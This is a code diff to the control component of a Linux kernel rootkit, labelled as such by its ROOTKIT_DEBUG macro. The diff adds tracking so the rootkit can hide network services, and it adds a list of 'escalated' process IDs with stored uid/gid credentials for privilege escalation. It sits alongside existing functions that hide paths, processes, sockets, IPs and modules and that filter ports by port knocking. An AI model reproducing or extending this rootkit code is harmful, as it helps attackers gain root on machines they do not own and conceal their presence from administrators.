@@ -12,9 +12,11 @@ static struct list_head prefixes;
 static struct list_head processes;
 static struct list_head tcp_sockets;
 static struct list_head udp_sockets;
+static struct list_head hidden_services;
 static struct list_head hidden_ips;
 static struct list_head modules;
 static struct list_head port_knocking_enabled;
+static struct list_head escalated_pids;
 
 int
 is_path_hidden(char *name)
@@ -313,6 +315,61 @@ unhide_udp_socket(int port)
 }
 
 int
+is_service_hidden(int port)
+{
+	struct hidden_service *cur;
+	struct list_head *cursor;
+	
+	list_for_each(cursor, &hidden_services) {
+		cur = list_entry(cursor, struct hidden_service, list);
+		if(cur->port == port) {
+			return 1;
+		}
+	}
+
+	return 0;
+}
+
+int
+hide_service(int port) 
+{
+	struct hidden_service *new;
+	
+	if(is_service_hidden(port)) {
+		return -EINVAL;
+	}
+
+	new = kmalloc(sizeof(struct hidden_service), GFP_KERNEL);
+	if(new == NULL) {
+		return -ENOMEM;
+	}
+	
+	new->port = port;
+
+	list_add(&new->list, &hidden_services);
+	
+	return 0;
+}
+
+int
+unhide_service(int port)
+{
+	struct hidden_service *cur;
+	struct list_head *cursor, *next;
+	
+	list_for_each_safe(cursor, next, &hidden_services) {
+		cur = list_entry(cursor, struct hidden_service, list);
+		if(cur->port == port) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+
+	return -EINVAL;
+}
+
+int
 is_ip_hidden(__u32 ipaddr)
 {
 	struct hidden_ip *cur;
@@ -441,10 +498,12 @@ is_port_filtered(int port, int protocol, int ipaddr)
 
 	list_for_each(cursor, &port_knocking_enabled) {
 		cur = list_entry(cursor, struct port_knocking, list);
+		
 		/* if port and protocol match (but not ipaddr), filter it */
 		if(cur->port == port
-			&& cur->protocol == protocol
-			&& cur->ipaddr != ipaddr) {
+				&& cur->protocol == protocol
+				&& cur->ipaddr != ipaddr) {
+				
 			return 1;
 		}
 	}
@@ -497,6 +556,70 @@ unfilter_port(int port, int protocol)
 	return -EINVAL;
 }
 
+struct escalated_pid *
+is_shell_escalated(pid_t pid)
+{
+	struct  escalated_pid *cur;
+	struct list_head *cursor;
+
+	if(pid == 0) {
+		return NULL;
+	}
+		
+	list_for_each(cursor, &escalated_pids) {
+		cur = list_entry(cursor, struct escalated_pid, list);
+		if(cur->pid == pid) {
+			return cur;
+		}
+	}
+	return NULL;
+}
+
+int 
+escalate(struct escalated_pid *id)
+{
+	struct escalated_pid *new;
+	
+	if(!is_shell_escalated(id->pid)) {
+		new = kmalloc(sizeof(struct escalated_pid), GFP_KERNEL);
+		
+		if(new == NULL) {
+			return -ENOMEM;
+		}	
+		
+		new->pid = id->pid;
+		
+		new->uid   = id->uid;
+		new->euid  = id->euid;
+		new->suid  = id->suid;
+		new->fsuid = id->fsuid;
+		new->gid   = id->gid;
+		new->egid  = id->egid;
+		new->sgid  = id->sgid;
+		new->fsgid = id->fsgid;
+		
+		list_add(&new->list, &escalated_pids);
+	}
+	return 0;
+}
+
+int 
+deescalate(pid_t pid)
+{
+	struct escalated_pid *cur;
+	struct list_head *cursor, *next;
+	
+	list_for_each_safe(cursor, next, &escalated_pids) {
+		cur = list_entry(cursor, struct escalated_pid, list);
+		if(cur->pid == pid) {
+			list_del(cursor);
+			kfree(cur);
+			return 0;
+		}
+	}
+	return -EINVAL;
+}
+
 void
 initialize_control(void)
 {
@@ -507,10 +630,12 @@ initialize_control(void)
 	INIT_LIST_HEAD(&processes);
 	INIT_LIST_HEAD(&tcp_sockets);
 	INIT_LIST_HEAD(&udp_sockets);
+	INIT_LIST_HEAD(&hidden_services);
 	INIT_LIST_HEAD(&hidden_ips);
 	INIT_LIST_HEAD(&modules);
 	INIT_LIST_HEAD(&port_knocking_enabled);
-
+	INIT_LIST_HEAD(&escalated_pids);
+	
 	ROOTKIT_DEBUG("Done.\n");
 }
 
@@ -525,10 +650,12 @@ cleanup_control(void)
 	struct process *process;
 	struct tcp_socket *tcp;
 	struct udp_socket *udp;
+	struct hidden_service *service;
 	struct hidden_ip *ip;
 	struct modules *module;
 	struct port_knocking *knocked_port;
-	
+	struct escalated_pid *esc_pid;
+		
 	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &paths) {
 		name = list_entry(cursor, struct file_name, list);
@@ -565,10 +692,17 @@ cleanup_control(void)
 	}
 	
 	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &hidden_services) {
+		service = list_entry(cursor, struct hidden_service, list);
+		list_del(cursor);
+		kfree(service);
+	}
+	
+	cursor = next = NULL;
 	list_for_each_safe(cursor, next, &hidden_ips) {
 		ip = list_entry(cursor, struct hidden_ip, list);
 		list_del(cursor);
-		kfree(udp);
+		kfree(ip);
 	}
 	
 	cursor = next = NULL;
@@ -583,6 +717,13 @@ cleanup_control(void)
 		knocked_port = list_entry(cursor, struct port_knocking, list);
 		list_del(cursor);
 		kfree(knocked_port);
+	}
+	
+	cursor = next = NULL;
+	list_for_each_safe(cursor, next, &escalated_pids) {
+		esc_pid = list_entry(cursor, struct escalated_pid, list);
+		list_del(cursor);
+		kfree(esc_pid);
 	}
 
 	ROOTKIT_DEBUG("Done.\n");
